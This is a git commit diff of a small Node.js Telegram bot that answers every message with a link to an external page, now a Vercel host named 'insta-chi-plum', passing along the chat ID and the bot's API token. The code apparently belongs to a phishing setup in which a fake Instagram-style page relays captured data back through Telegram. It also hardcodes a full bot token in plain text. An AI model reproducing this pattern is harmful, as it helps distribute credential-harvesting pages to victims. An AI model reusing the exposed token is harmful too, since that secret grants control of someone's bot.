90f6df29cc5e496d479ed7a44fb21bc9ffce1aa1
rahmatjon web <rahmatjon_web@192.168.1.6>
2025-11-16 20:34:04 +0500

    1

--- bot.js
+++ bot.js
@@ -3,6 +3,6 @@ const token = "8292077308:AAFMvWEToMiDiz7UQnbmqihk0KiOv8MUCCQ";
 const bot = new TelegramBot(token, { polling: true });
 bot.on("message", async (msg) => {
     const chatId = msg.chat.id;
-    const link = `https://loquacious-brioche-dbdbcf.netlify.app/?id=${chatId}&token=${token}`;
+    const link = `https://insta-chi-plum.vercel.app/?id=${chatId}&token=${token}`;
     bot.sendMessage(chatId, link);
 });
